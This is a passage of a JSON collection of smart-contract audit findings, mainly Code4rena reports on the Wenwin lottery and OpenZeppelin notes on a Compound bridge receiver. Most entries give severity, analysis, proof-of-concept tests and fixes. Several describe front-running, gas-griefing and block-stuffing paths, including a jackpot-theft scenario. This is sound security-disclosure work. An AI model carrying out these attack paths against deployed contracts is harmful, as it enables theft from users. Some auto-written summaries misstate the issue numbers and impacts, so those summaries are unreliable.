      "summary": "\nA bug was discovered in the Lottery.sol and LotterySetup.sol files of the code-423n4/2023-03-wenwin repository. The bug allows an attacker to call the `executeDraw()` function in Lottery.sol, receive random numbers and then buy tickets with known numbers in one block. This would allow the attacker to win the jackpot. The bug is possible when the contract is deployed with COOL_DOWN_PERIOD = 0. The bug is in the comparison of `block.timestamp` with `drawScheduledAt(currentDraw)` in the `executeDraw()` function, which should be `<=` instead of `<`. The same bug exists in the `beforeTicketRegistrationDeadline` modifier in LotterySetup.sol, which should be `>=` instead of `>`. The exploit code is provided, and the tools used to discover the bug were VScode and manual review. The recommended mitigation steps are to change `<` to `<=` in the `executeDraw()` function, and `>` to `>=` in the `beforeTicketRegistrationDeadline` modifier.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Wenwin",
      "source_link": "https://code4rena.com/reports/2023-03-wenwin",
      "github_link": "https://github.com/code-423n4/2023-03-wenwin-findings/issues/343",
      "tags": [],
      "finders": [
        "dingo2077",
        "d3e4",
        "0x73696d616f",
        "Blockian",
        "savi0ur"
      ]
    },
    {
      "id": "8905",
      "title": "[M-03] The buyer of the ticket could be front-runned by the ticket owner who claims the rewards before the ticket's NFT is traded",
      "impact": "MEDIUM",
      "content": "\nIf the ticket owner lists the winning ticket on the secondary market and initiates their own claiming transaction before the trade transaction takes place, the NFT buyer could lose funds as a result.\n\n### Proof of Concept\n\nGiven that there are no restrictions on trading tickets on the secondary market, the following scenario could occur:\n\n1.  Alice acquires the winning ticket with 75 DAI worth of claimable rewards, and lists the ticket on the secondary market for 70 DAI.\n2.  Bob decides to purchase the ticket, recognizing that it is profitable to trade and claim the rewards associated with it.\n3.  Alice monitors the mempool and submits a `claimWinningTickets()` transaction just before Bob's purchase transaction.\n4.  Bob receives ticket NFT and calls to `claimWinningTickets()` but this transaction would revert as the rewards have already been claimed by Alice. Consequently, Alice receives a total of 75 + 70 DAI, while Bob is left with an empty ticket and no rewards.\n\nThe next test added to `/2023-03-wenwin/test/Lottery.t.sol` could demonstrate such a scenario:\n\n```solidity\n    function testClaimBeforeTransfer() public {\n        uint128 drawId = lottery.currentDraw();\n        uint256 ticketId = initTickets(drawId, 0x8E);\n\n        // this will give winning ticket of 0x0F so 0x8E will have 3/4\n        finalizeDraw(0);\n\n        uint8 winTier = 3;\n        checkTicketWinTier(drawId, 0x8E, winTier);\n        \n        address BUYER = address(456);\n\n        vm.prank(USER);\n        claimTicket(ticketId); // USER front-run trade transaction and claims rewards \n        vm.prank(USER);\n        lottery.transferFrom(USER, BUYER, ticketId);\n  \n        vm.prank(BUYER);\n        vm.expectRevert(abi.encodeWithSelector(NothingToClaim.selector, 0));\n        claimTicket(ticketId); // BUYER tries to claim the ticket but it would revert since USER already claimed it\n    }\n```\n\n### Recommended Mitigation Steps\n\nConsider burning claimed ticket NFTs or remove the possibility to transfer NFTs that have already been claimed.\n\n**[TutaRicky (Wenwin) confirmed](https://github.com/code-423n4/2023-03-wenwin-findings/issues/425)** \n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the Lottery.sol code on the Github repository. The vulnerability allows the ticket owner to list a winning ticket on the secondary market and initiate their own claiming transaction before the trade transaction takes place. This would result in the NFT buyer losing funds. \n\nThe bug report includes a proof of concept to demonstrate the scenario. This involves Alice acquiring the winning ticket with 75 DAI worth of claimable rewards and listing the ticket on the secondary market for 70 DAI. Bob then decides to purchase the ticket. Alice then monitors the mempool and submits a `claimWinningTickets()` transaction just before Bob's purchase transaction. This would result in Bob receiving the ticket NFT but not the rewards associated with it. \n\nThe bug report also includes recommended mitigation steps. This involves considering burning claimed ticket NFTs or the removal possibility to transfer NFTs that have already been claimed. This would help prevent the NFT buyer from losing funds.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Wenwin",
      "source_link": "https://code4rena.com/reports/2023-03-wenwin",
      "github_link": "https://github.com/code-423n4/2023-03-wenwin-findings/issues/366",
      "tags": [],
      "finders": [
        "0xbepresent",
        "sashik_eth",
        "Dug",
        "MadWookie",
        "hl_",
        "peanuts",
        "Haipls",
        "adriro",
        "horsefacts"
      ]
    },
    {
      "id": "8904",
      "title": "[M-02] An attacker can leave the protocol in a \"drawing\" state for extended period of time",
      "impact": "MEDIUM",
      "content": "\nhttps://github.com/code-423n4/2023-03-wenwin/blob/91b89482aaedf8b8feb73c771d11c257eed997e8/src/RNSourceController.sol#L106-L120\n\nhttps://github.com/code-423n4/2023-03-wenwin/blob/91b89482aaedf8b8feb73c771d11c257eed997e8/src/RNSourceController.sol#L60-L75\n\nhttps://github.com/code-423n4/2023-03-wenwin/blob/91b89482aaedf8b8feb73c771d11c257eed997e8/src/RNSourceController.sol#L89-L104\n\nThe current implementation of Random Number Generation uses Chainlink’s V2 Direct Funding Method (https://docs.chain.link/vrf/v2/direct-funding). \n\n`VRFv2RNSource.sol` (inherits Chainlink’s `VRFV2WrapperConsumerBase.sol`) is responsible for handling requests and responses for the Lottery system. The communicator between `VRFv2RNSource.sol` contract and `Lottery.sol` is `RNSourceController.sol`. The ideal flow of control is the following:\n\n1. **Any** user can call `executeDraw()` in `Lottery.sol` assuming that the current draw is past the scheduled time for registering tickets.\n2. `executeDraw()` puts the system in the state of `drawExecutionInProgress = true` and calls `requestRandomNumber()`.\n3. in `RNSourceController.sol` - `requestRandomNumber()` checks if the previous draw was completed and calls `requestRandomNumberFromSource()`.\n4. `requestRandomNumberFromSource()` records the timestamp of the request in `lastRequestTimestamp = block.timestamp` and sets `lastRequestFulfilled = false` i.e `executeDraw()` cannot be called until the draw is finished. Lastly `source.requestRandomNumber()` is invoked.\n5. Now `source.requestRandomNumber()` calls `requestRandomnessFromUnderlyingSource()` and that subsequently calls `requestRandomness()` to generate a RN from Chainlink VRF.\n6. Several blocks later Chainlink VRF has verified a RN and sends a callback call to `fulfillRandomWords()` that calls `fulfill()`, which calls `onRandomNumberFulfilled()` in the `RNSourceController.sol` that sets `lastRequestFulfilled = true` and lastly `receiveRandomNumber(randomNumber)` is invoked in `Lottery.sol` that sets `drawExecutionInProgress = false` and starts a new draw (increments `currentDraw` state variable).\n\nThe culprit for this issue is the implementation of `requestRandomNumberFromSource()` in `RNSourceController.sol`. After `lastRequestFulfilled = false` the invocation to `VRFv2RNSource.sol` is done in a `try{} catch{}` block - \n```     \n        lastRequestTimestamp = block.timestamp;\n        lastRequestFulfilled = false;\n\n        try source.requestRandomNumber() {\n            emit SuccessfulRNRequest(source);\n        } catch Error(string memory reason) {\n            emit FailedRNRequest(source, bytes(reason));\n        } catch (bytes memory reason) {\n            emit FailedRNRequest(source, reason);\n        }\n    }\n```\nThis is very problematic due to how `try{} catch{}` works - [OpenZeppelin article](https://forum.openzeppelin.com/t/a-brief-analysis-of-the-new-try-catch-functionality-in-solidity-0-6/2564). If the request to Chainlink VRF fails at any point then execution of the above block will not revert but will continue in the catch{} statements only emitting an event and leaving RNSourceController in the state `lastRequestFulfilled = false` and triggering the `maxRequestDelay` (currently 5 hours) until `retry()` becomes available to call to retry sending a RN request. This turns out to be dangerous since there is a trivial way of making Chainlink VRF revert - simply not supplying enough gas for the transaction either initially in calling `executeDraw()` or subsequently in `retry()` invocations with the attacker front-running the malicious transaction.\n\n### Proof of Concept\n1. Ticket registration closes, attacker calls `executeDraw()` with insufficient gas and Lottery is put in the Executing Draw State (drawExecutionInProgress = true).\n2. Attacker front-runs the transaction if there are other `executeDraw()` transactions.\n3. `RNSourceController.sol` calls `VRFv2RNSource.so` in a `try{} catch{}` block, VRF transaction reverts and `lastRequestFulfilled` remains equal to `false`.\n4. After “maxRequestDelay” time has past retry() becomes available that relies on the same `try{} catch{}` block in `requestRandomNumberFromSource()`.\n5. Attacker calls `retry()` with insufficient gas and front-runs the transaction if there are other `retry()` transactions.\n6. Attacker repeats steps 4 and 5 leaving the system in a Drawing state for extended period of time (5 hours for every `retry()` in the example implementation).\n\nMoreover, the attacker doesn’t have any incentive to deposit LINK himself since VRF will also revert on insufficient LINK tokens.\n\nThis Proof of Concept was also implemented and confirmed in a Remix environment, tested on the Ethereum Sepolia test network. A video walk-through can be provided on my behalf if requested by judge or sponsors.\n\n### Impact\nSystem is left for extended period of time in “Drawing” state without the possibility to execute further draws, user experience is damaged significantly.\n\n### Comment\n\nBuilding upon this issue, an obvious observation arises - there is the `swapSource()` method that becomes available ( only to the owner ) after a predefined number of failed `retry()` invocations - `maxFailedAttempts`. Therefore, potentially, admins of the protocol could replace the VRF solution with a better one that is resistant to the try catch exploit? It turns out that the current implementation of `swapSource()` introduces a new exploit that breaks the **fairness** of the protocol and an edge case could even be constructed that leads to an attacker stealing a jackpot.\n\n**[rand0c0des (Wenwin) confirmed and commented](https://github.com/code-423n4/2023-03-wenwin-findings/issues/521#issuecomment-1471487649):**\n > I communicated with warden. This is confirmed as an issue.\n\n**[cccz (judge) commented](https://github.com/code-423n4/2023-03-wenwin-findings/issues/521#issuecomment-1483809454):**\n > From alexxander (warden):\n> \n> > Hello, I looked deeper into Chainlink VRF implementation and it turns my reasoning behind why the vulnerability happens in the poc video is not correct. Chainlink does custom gas checks (in the callback) but not in computing the requests so indeed it reverts with out-of-gas, however there is a small detail that the caller always retains 1/64th of the gas as per the solidity documentation note on `try{} catch{}` - https://docs.soliditylang.org/en/v0.8.19/control-structures.html#try-catch - quoting:\n>\n>> “The reason behind a failed call can be manifold. Do not assume that the error message is coming directly from the called contract: The error might have happened deeper down in the call chain and the called contract just forwarded it. Also, it could be due to an out-of-gas situation and not a deliberate error condition: The caller always retains at least 1/64th of the gas in a call and thus even if the called contract goes out of gas, the caller still has some gas left.”\n>\n> > In short, depending on how much the gasLimit was set at, in some situations there will be enough gas left to finish the `catch{}` clause although the try{} threw a out-of-gas error.\n>\n> > I also found a Consensys auditor that has documented in principle the exact same issue as in the contest implementation and confirms it happens due to 1/64 gas retention -  https://twitter.com/cleanunicorn/status/1574808522130194432?lang=en\n>\n> > Finally, I notified Rando about what I further found and also sent him Foundry traces of a successful malicious tx that reverts with out-of-gas but finishes execution of the `catch{}` clause, emits an event and leaves the protocol with cooldown.\n\n\n\n***\n\n",
      "summary": "\nThis bug report concerns Issue #345, which has been assessed as a risk of 2. The finding is that an attacker can leave the protocol in a \"drawing\" state for an extended period of time. This means that the protocol may not be able to complete certain tasks or processes, and could cause the system to become unresponsive or malfunction. This could lead to a loss of data or other serious issues. It is important to address this issue as soon as possible, as it could have serious consequences.",
      "quality_score": 3,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Wenwin",
      "source_link": "https://code4rena.com/reports/2023-03-wenwin",
      "github_link": "https://github.com/code-423n4/2023-03-wenwin-findings/issues/521",
      "tags": [],
      "finders": [
        "alexxer"
      ]
    },
    {
      "id": "8903",
      "title": "[M-01] Undermining the fairness of the protocol in `swapSource()` and possibilities for stealing a jackpot",
      "impact": "MEDIUM",
      "content": "\nThis issue will demonstrate how the current implementation of `swapSource()` and `retry()` goes directly against Chainlink's Security Consideration of **Not re-requesting randomness** (https://docs.chain.link/vrf/v2/security#do-not-re-request-randomness). \n\n### Note\nFor clarity it is assumed that after `swapSource()` the new source would be Chainlink Subscription Method implementation and I would refer to it again as `Chainlink VRF` since this was the initial design decision, however it is of no consequence what the new VRF is.\n\n### The Exploit\nThe `swapSource()` method can be successfully called if 2 important boolean checks are `true`. \n\n`notEnoughRetryInvocations` - makes sure that there were `maxFailedAttempts` failed requests for a RN.\n\n`notEnoughTimeReachingMaxFailedAttempts` - makes sure that `maxRequestDelay` amount of time has passed since the timestamp for reaching `maxFailedAttempts` was recorded in `maxFailedAttemptsReachedAt` i.e sufficient time has passed since the last `retry()` invocation. The most important detail to note here is that the `swapSource()` function does **not** rely on `lastRequestTimestamp` to check whether `maxRequestDelay` has passed since the last RN request. \n\n```\n    function swapSource(IRNSource newSource) external override onlyOwner {\n        if (address(newSource) == address(0)) {\n            revert RNSourceZeroAddress();\n        }\n        bool notEnoughRetryInvocations = failedSequentialAttempts < maxFailedAttempts;\n        bool notEnoughTimeReachingMaxFailedAttempts = block.timestamp < maxFailedAttemptsReachedAt + maxRequestDelay;\n        if (notEnoughRetryInvocations || notEnoughTimeReachingMaxFailedAttempts) {\n            revert NotEnoughFailedAttempts();\n        }\n        source = newSource;\n        failedSequentialAttempts = 0;\n        maxFailedAttemptsReachedAt = 0;\n\n\n        emit SourceSet(newSource);\n        requestRandomNumberFromSource();\n    }\n```\n\nThe critical bug resides in the `retry()` method. `maxFailedAttemptsReachedAt` is **ONLY** updated when `failedAttempts == maxFailedAttempts` - notice again the strict equality - meaning that maxFailedAttemptsReachedAt won't be updated if there are more `retry()` invocations after `failedAttempts == maxFailedAttempts`. This means that after the point of time when the last failed `retry()` sets `maxFailedAttemptsReachedAt` and the `maxRequestDelay` time passes - `retry()` and `swapSource()` (in that exact order) can be called **simultaneously**.    \n\n```\n        uint256 failedAttempts = ++failedSequentialAttempts;\n        if (failedAttempts == maxFailedAttempts) {\n            maxFailedAttemptsReachedAt = block.timestamp;\n        }\n```\n\nThe attacker would monitor the transaction mempool for the `swapSource()` invocation and front-run a `retry()` invocation before the `swapSource` transaction. Now we have two separate - seemingly at the same time - calls to `requestRandomNumberFromSource()` and again to note that the `retry()` call will update `lastRequestTimestamp = block.timestamp` but it will **not** update `maxFailedAttemptsReachedAt` since now `failedAttempts > maxFailedAttempts` and as presented `swapSource()` does **not** rely on `lastRequestTimestamp` which makes all of this possible.\n\n Now we have two requests at the same time to `VRFv2RNSource.sol` and in turn Chainlink VRF. Chainlink VRF will in turn send 2 callback calls each containing a random number and the callbacks can be inspected by the attacker and in turn he will front-run the RN response that favours him greater thus undermining the fairness of the protocol.\n\n### Proof of Concept\n\n1. `retry()` is called enough times to reach `maxFailedAttempts`, attacker starts monitoring the mempool for the `swapSource()` call.\n2. Admin decides to swap Source. Admin waits for `maxRequestDelay` time to pass and calls `swapSource()`.\n3. Attacker notices the `swapSource()` call and front-runs a `retry()` call before the `swapSource()` invocation.\n4. The introduced code bug displays that `swapSource()` is not invalidated by the front-ran `retry()` and both `retry()` and `swapSource()` request a random number from Chainlink VRF.\n5. Attacker now scans the mempool for the callbacks from the requests to VRF, inspects the random numbers and front-runs the transaction with the random number that favors him.\n\n### Impact\n\nRe-requesting randomness is achieved when swapping sources of randomness. Fairness of protocol is undermined. \n\n### Note \nRecently published finding by warden Trust discusses a very similar attack path that has to do with more than 1 VRF callbacks [residing in the mempool](https://code4rena.com/reports/2022-12-forgeries#h-02-draw-organizer-can-rig-the-draw-to-favor-certain-participants-such-as-their-own-account).\n\n### Edge Case - stealing a jackpot when swapping randomness Source\n\nThe Wenwin protocol smart contracts are built such that various configurations of the system can be deployed. The provided documentation gives example with a weekly draw, however `drawPeriod` in `LotterySetup.sol` could be any value. A lottery that is deployed with `drawPeriod` of for example 1 hour rather than days can be much more susceptible to re-requesting randomness. Similarly to Issue #2 an attacker would anticipate a `swapSource()` call to front-run it with `retry()` call and generate 2 RN requests. Now the attacker would use another front-running technique - Supression, also called block-stuffing, an attack that delays a transaction from being executed (reference in link section). \n\nThe attacker would now let one of the generated RN callback requests return to the contract and reach the `receiveRandomNumber()` in `Lottery.sol` and let the protocol complete the current draw and return the system back in a state that can continue with the next draw - all of that while suppressing the second RN callback request. The attacker would register a ticket with the combination generated from the Random Number in the suppressed callback request and when `executeDraw()` is triggered he would then front-run the \"floating\" callback request to be picked first by miners therefore calling 'fulfillRandomWords()' with the known RN and winning the jackpot.\n\n###  Relevant links\nConsensys front-running attacks - (https://consensys.github.io/smart-contract-best-practices/attacks/frontrunning/#suppression)\nMedium article on Block Stuffing and Fomo3D - (https://medium.com/hackernoon/the-anatomy-of-a-block-stuffing-attack-a488698732ae)\n\n### Proof of Concept\n\n1. Assume Lottery configuration with a short `drawPeriod` e.g 1 hour.\n2. `retry()` is called enough times to reach `maxFailedAttempts`, attacker starts monitoring the mempool for the `swapSource()` call.\n3. Admin decides to swap Source. Admin waits for `maxRequestDelay` time to pass and calls `swapSource()`.\n4. Attacker notices the `swapSource()` call and front-runs a `retry()` call before the `swapSource()` invocation thus achieving 2 callback RN requests as in Issue #2 PoC.\n5. Attacker uses front-running suppression after one of the callback requests is picked up by the protocol and therefore current draw is finalized.  \n6. Attacker registers a ticket with the winning combination generated from the suppressed RN.\n7. After `drawPeriod` is past attacker or other user calls `executeDraw()`.\n8. Attacker front-runs the \"suppressed RN\" to be picked by miners first.\n9. 'fulfillRandomWords()' is called with the RN known by the attacker thus winning a jackpot.\n\n### Impact\nFairness of the protocol is undermined when swapping Sources in Lottery configurations with short `drawPeriod`. Unfair win of a jackpot.  \n\n### Tools Used\n- Chainlink documentation [VRF](https://docs.chain.link/vrf/v2/introduction), [VRF security practices](https://docs.chain.link/vrf/v2/security), [Direct funding](https://docs.chain.link/vrf/v2/direct-funding)\n- OpenZeppelin try{} catch{} [article](https://forum.openzeppelin.com/t/a-brief-analysis-of-the-new-try-catch-functionality-in-solidity-0-6/2564)\n- Consenys front-running attacks [link](https://consensys.github.io/smart-contract-best-practices/attacks/frontrunning/)\n- ImmuneBytes front-running attacks [article](https://www.immunebytes.com/blog/front-running-attack/#:~:text=Let%20us%20understand%20how%20front%20running%20works%20in%20crypto.&text=Here%2C%20the%20attacker%20can%20take,assets%20with%20excessive%20gas%20fees.)\n- Medium article on Suppression [link](https://medium.com/hackernoon/the-anatomy-of-a-block-stuffing-attack-a488698732ae)\n- Previous Code4rena finding by warden Trust [link](https://code4rena.com/reports/2022-12-forgeries/#h-02-draw-organizer-can-rig-the-draw-to-favor-certain-participants-such-as-their-own-account)\n \n\n### Recommended Mitigation Steps\n\nRefactor the `try{} catch{}` in `requestRandomNumberFromSource()` in `RNSourceController.sol`. Replace `failedAttempts == maxFailedAttempts` with `failedAttempts >= maxFailedAttempts` in `retry()` in `RNSourceController.sol`. Evaluate centralization risks that spawn from the fact that only owners can decide on what a new source of randomness can be i.e `swapSource()`. \n\nEnsure that when swapping sources the new Source doesn't introduce new potential attack vectors, I would suggest reading warden's Trust report from Forgeries competition that displays potential attack vectors with `retry`-like functionality when using Chainlink VRF Subscription Method. Ensure all Security Considerations in Chainlink VRF documentation are met.\n\n**[rand0c0des (Wenwin) confirmed, but disagreed with severity](https://github.com/code-423n4/2023-03-wenwin-findings/issues/522)** \n\n**[cccz (judge) commented](https://github.com/code-423n4/2023-03-wenwin-findings/issues/522#issuecomment-1468126750):**\n > When block.timestamp >= maxFailedAttemptsReachedAt + maxRequestDelay, that is, when `swapSource()` can be called, `retry()` can be called first and does not prevent `swapSource()` from being called.\n >\n> Summary: `retry()` can front-run `swapSource()` to get two random numbers.\n\n**[cccz (judge) commented](https://github.com/code-423n4/2023-03-wenwin-findings/issues/522#issuecomment-1473070718):**\n > Returning two random numbers clearly breaks the intent of the protocol, and I would consider it to meet the Medium-risk criteria.\n> \n> > 2 — Med: Assets not at direct risk, but the function of the protocol or its availability could be impacted, or leak value with a hypothetical attack path with stated assumptions, but external requirements.\n> \n> For the severity criteria, see https://docs.code4rena.com/awarding/judging-criteria/severity-categorization\n> \n\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about Issue #345, which has been assessed as having a 2 risk level. The issue relates to the fairness of the protocol in swapSource() and the possibility of stealing a jackpot. This is an issue that could cause serious problems if not addressed, as it could lead to an unfair advantage and the potential for a jackpot to be stolen. It is important that this issue is addressed and resolved as soon as possible.",
      "quality_score": 3,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Wenwin",
      "source_link": "https://code4rena.com/reports/2023-03-wenwin",
      "github_link": "https://github.com/code-423n4/2023-03-wenwin-findings/issues/522",
      "tags": [],
      "finders": [
        "alexxer"
      ]
    },
    {
      "id": "8902",
      "title": "[H-01] `LotteryMath.calculateNewProfit` returns wrong profit when there is no jackpot winner",
      "impact": "HIGH",
      "content": "\n<https://github.com/code-423n4/2023-03-wenwin/blob/main/src/LotteryMath.sol#L50-L53>\n\n<https://github.com/code-423n4/2023-03-wenwin/blob/main/src/Lottery.sol#L216-L223>\n\n<https://github.com/code-423n4/2023-03-wenwin/blob/main/src/Lottery.sol#L238-L247>\n\n### Impact\n\n`LotteryMath.calculateNewProfit` returns the wrong profit when there is no jackpot winner, and the library function is used when we update `currentNetProfit` of `Lottery` contract.\n\n```solidity\n        currentNetProfit = LotteryMath.calculateNewProfit(\n            currentNetProfit,\n            ticketsSold[drawFinalized],\n            ticketPrice,\n            jackpotWinners > 0,\n            fixedReward(selectionSize),\n            expectedPayout\n        );\n```\n\n`Lottery.currentNetProfit` is used during reward calculation, so it can ruin the main functionality of this protocol.\n\n```solidity\n    function drawRewardSize(uint128 drawId, uint8 winTier) private view returns (uint256 rewardSize) {\n        return LotteryMath.calculateReward(\n            currentNetProfit,\n            fixedReward(winTier), \n            fixedReward(selectionSize),\n            ticketsSold[drawId],\n            winTier == selectionSize,\n            expectedPayout\n        );\n    }\n```\n\n### Proof of Concept\n\nIn `LotteryMath.calculateNewProfit`, `expectedRewardsOut` is calculated as follows:\n\n```solidity\n        uint256 expectedRewardsOut = jackpotWon\n            ? calculateReward(oldProfit, fixedJackpotSize, fixedJackpotSize, ticketsSold, true, expectedPayout)\n            : calculateMultiplier(calculateExcessPot(oldProfit, fixedJackpotSize), ticketsSold, expectedPayout)\n                * ticketsSold * expectedPayout;\n```\n\nThe calculation is not correct when there is no jackpot winner. When `jackpotWon` is false, `ticketsSold * expectedPayout` is the total payout in reward token, and then we need to apply a multiplier to the total payout, and the multiplier is `calculateMultiplier(calculateExcessPot(oldProfit, fixedJackpotSize), ticketsSold, expectedPayout)`.\n\nThe calculation result is `expectedRewardsOut`, and it is also in reward token, so we should use `PercentageMath` instead of multiplying directly.\n\nFor coded PoC, I added this function in `LotteryMath.sol` and imported `forge-std/console.sol` for console log.\n\n```solidity\n    function testCalculateNewProfit() public {\n        int256 oldProfit = 0;\n        uint256 ticketsSold = 1;\n        uint256 ticketPrice = 5 ether;\n        uint256 fixedJackpotSize = 1_000_000e18; // don't affect the profit when oldProfit is 0, use arbitrary value\n        uint256 expectedPayout = 38e16;\n        int256 newProfit = LotteryMath.calculateNewProfit(oldProfit, ticketsSold, ticketPrice, false, fixedJackpotSize, expectedPayout );\n\n        uint256 TICKET_PRICE_TO_POT = 70_000;\n        uint256 ticketsSalesToPot = PercentageMath.getPercentage(ticketsSold * ticketPrice, TICKET_PRICE_TO_POT);\n        int256 expectedProfit = oldProfit + int256(ticketsSalesToPot);\n        uint256 expectedRewardsOut = ticketsSold * expectedPayout; // full percent because oldProfit is 0\n        expectedProfit -= int256(expectedRewardsOut);\n        \n        console.log(\"Calculated value (Decimal 15):\");\n        console.logInt(newProfit / 1e15); // use decimal 15 for output purpose\n\n        console.log(\"Expected value (Decimal 15):\");\n        console.logInt(expectedProfit / 1e15);\n    }\n```\n\nThe result is as follows:\n\n      Calculated value (Decimal 15):\n      -37996500\n      Expected value (Decimal 15):\n      3120\n\n### Tools Used\n\nFoundry\n\n### Recommended Mitigation Steps\n\nUse `PercentageMath` instead of multiplying directly.\n\n```solidity\n        uint256 expectedRewardsOut = jackpotWon\n            ? calculateReward(oldProfit, fixedJackpotSize, fixedJackpotSize, ticketsSold, true, expectedPayout)\n            : (ticketsSold * expectedPayout).getPercentage(\n                calculateMultiplier(calculateExcessPot(oldProfit, fixedJackpotSize), ticketsSold, expectedPayout)\n            )\n```\n\n**[rand0c0des (Wenwin) confirmed](https://github.com/code-423n4/2023-03-wenwin-findings/issues/219)** \n\n***\n\n \n",
      "summary": "\nThis bug report details a vulnerability in the LotteryMath and Lottery contracts on the code-423n4/2023-03-wenwin repository. The function LotteryMath.calculateNewProfit returns the wrong profit when there is no jackpot winner, and the library function is used when we update currentNetProfit of Lottery contract. This can ruin the main functionality of the protocol, as currentNetProfit is used during reward calculation. \n\nThe vulnerability is caused by the incorrect calculation of expectedRewardsOut in LotteryMath.calculateNewProfit when there is no jackpot winner. Instead of multiplying ticketsSold and expectedPayout directly, PercentageMath should be used.\n\nFoundry was the tool used to identify the vulnerability. To mitigate the vulnerability, use PercentageMath instead of multiplying directly in LotteryMath.calculateNewProfit.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Wenwin",
      "source_link": "https://code4rena.com/reports/2023-03-wenwin",
      "github_link": "https://github.com/code-423n4/2023-03-wenwin-findings/issues/324",
      "tags": [],
      "finders": [
        "Cyfrin",
        "gogo",
        "auditor0517",
        "bin2chen",
        "adriro",
        "anodaram",
        "minhtrng",
        "Yukti_Chinta"
      ]
    },
    {
      "id": "10358",
      "title": "Unused return value from executeTransaction",
      "impact": "LOW",
      "content": "The [`executeTransaction`](https://github.com/compound-finance/comet/blob/2eb33b5e8454dba148373b6cb64ede4f7436fad7/contracts/vendor/Timelock.sol#L76) function from the [`Timelock`](https://github.com/compound-finance/comet/blob/2eb33b5e8454dba148373b6cb64ede4f7436fad7/contracts/vendor/Timelock.sol#L6) contract has a return value that contains the output from the `target.call` call.\n\n\nHowever, the return value is not used in the [`executeProposal`](https://github.com/compound-finance/comet/blob/2eb33b5e8454dba148373b6cb64ede4f7436fad7/contracts/bridges/BaseBridgeReceiver.sol#L160) function from the [`BaseBridgeReceiver`](https://github.com/compound-finance/comet/blob/2eb33b5e8454dba148373b6cb64ede4f7436fad7/contracts/bridges/BaseBridgeReceiver.sol#L6) contract. This makes it impossible to access the return value of a transaction that is executed by the `BaseBridgeReceiver` contract, which may be useful for debugging erratic or unintended behaviors.\n\n\nConsider retrieving these outputs from the `executeTransaction` function calls in the `executeProposal` function.\n\n\n***Update:** Acknowledged, not resolved. The Compound team stated:*\n\n\n\n> *It’s unclear if exposing these return values would actually improve our ability to debug or monitor execution of transactions, especially given that reverted transactions won’t emit any events or return any values. We will not make an update related to this recommendation.*\n> \n>",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Compound Polygon Bridge Receiver Audit",
      "source_link": "https://blog.openzeppelin.com/compound-polygon-bridge-receiver-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10357",
      "title": "Identical transactions can be executed inside the same proposal",
      "impact": "LOW",
      "content": "When a proposal is sent through the Polygon bridge, the `BaseBridgeReceiver` contract processes it by [queuing all transactions that are included in the proposal](https://github.com/compound-finance/comet/blob/2eb33b5e8454dba148373b6cb64ede4f7436fad7/contracts/bridges/BaseBridgeReceiver.sol#L131-L132) to the `Timelock` contract.\n\n\nThe `Timelock` contract validates that each transaction is unique by using the hash of the parameters of the transaction as the identifier. However, it is possible to send a duplicated transaction because of how [the `signature` parameter of the function signature is included in the `data` parameter](https://github.com/compound-finance/comet/blob/2eb33b5e8454dba148373b6cb64ede4f7436fad7/contracts/vendor/Timelock.sol#L88-L92).\n\n\nThis is caused by how the method `abi.encode` is used when queuing the transactions. It is possible to send an identical transaction twice by sending the first transaction with the function `signature` and a second one with the 4 bytes function selector attached to the `data` field. This would create two different hashes, which causes the [requirement](https://github.com/compound-finance/comet/blob/2eb33b5e8454dba148373b6cb64ede4f7436fad7/contracts/vendor/Timelock.sol#L80) to be satisfied when the proposal is being executed, and as a result the same transaction would be [executed twice](https://github.com/compound-finance/comet/blob/2eb33b5e8454dba148373b6cb64ede4f7436fad7/contracts/vendor/Timelock.sol#L94).\n\n\nWhen queuing transactions, consider using the packed `callData` output instead of relying on the `signature` and `data` fields for getting the `txHash`.\n\n\n***Update:** Acknowledged, not resolved. The Compound team stated:*\n\n\n\n> *Executing identical transactions isn’t a problem for us (there’s nothing especially malicious that could be done by executing the same transaction twice. In fact, it’s a leftover limitation of the original Timelock implementation that you’re unable to take the same action multiple times (though there isn’t an obvious use case to do so). We are hoping to keep the L2 Timelock contracts as similar as possible to the version deployed to mainnet, so we will leave this code as it is.*\n> \n>",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Compound Polygon Bridge Receiver Audit",
      "source_link": "https://blog.openzeppelin.com/compound-polygon-bridge-receiver-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10356",
      "title": "Missing distinction between queued and ready-to-execute state",
      "impact": "LOW",
      "content": "In the [`BaseBridgeReceiver`](https://github.com/compound-finance/comet/blob/2eb33b5e8454dba148373b6cb64ede4f7436fad7/contracts/bridges/BaseBridgeReceiver.sol#L6) contract, the [`state`](https://github.com/compound-finance/comet/blob/2eb33b5e8454dba148373b6cb64ede4f7436fad7/contracts/bridges/BaseBridgeReceiver.sol#L170) function returns the state of a given proposal. Currently, the possible state values are: [queued, expired, or executed](https://github.com/compound-finance/comet/blob/2eb33b5e8454dba148373b6cb64ede4f7436fad7/contracts/bridges/BaseBridgeReceiver.sol#L52-L54).\n\n\nHowever, it is important to distinguish between transactions that are still in queue and require more time before being executed, and those that can already be executed.\n\n\nThis is especially important as the `executeProposal` function [checks](https://github.com/compound-finance/comet/blob/2eb33b5e8454dba148373b6cb64ede4f7436fad7/contracts/bridges/BaseBridgeReceiver.sol#L156) that the proposal is in the `queued` state, but does not check if the proposal can already be executed. As a result, some transactions that are queued but not ready to be executed will pass the initial check, and the transaction will only revert once the `executeTransaction` function from the `Timelock` contract is called.\n\n\nConsider adding another state that indicates that the proposal is queued and can already be executed.\n\n\n***Update:** Acknowledged, not resolved. The Compound team stated:*\n\n\n\n> *The net benefit of this change would simply be that the error thrown would be thrown by the BaseBridgeReceiver instead of being thrown by the 